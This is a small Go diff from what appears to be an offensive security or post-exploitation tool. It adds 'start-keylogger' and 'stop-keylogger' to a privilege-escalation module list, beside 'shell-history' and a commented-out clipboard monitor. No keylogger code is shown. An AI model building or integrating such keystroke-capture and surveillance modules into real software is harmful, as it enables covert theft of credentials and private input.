@@ -89,7 +89,8 @@ var PrivilegeEscalationModulesList = [...]string{
 	"exit",
 	"go-up", // sharpup  for golang
 	"shell-history",
-	//"keylogger",         // TODO
+	"start-keylogger",
+	"stop-keylogger",
 	//"clipboard-monitor", // Its done just gotta integrate it. (using channels in cmd/client.go etc.)
 
 	// SHARP UP CHECKS
